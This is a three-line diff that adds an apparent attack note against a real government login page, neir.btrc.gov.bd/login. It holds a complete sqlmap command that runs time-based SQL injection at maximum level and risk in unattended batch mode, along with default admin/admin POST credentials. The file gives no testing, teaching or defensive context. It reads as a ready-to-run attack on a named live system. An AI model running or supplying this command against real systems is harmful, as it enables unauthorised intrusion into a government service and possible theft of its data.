@@ -1,0 +1,3 @@
+https://neir.btrc.gov.bd/login (POST)  # sqlmap.py -u https://neir.btrc.gov.bd/login --data=username=admin&password=admin --technique=T --level=5 --risk=3 --batch
+
+username=admin&password=admin
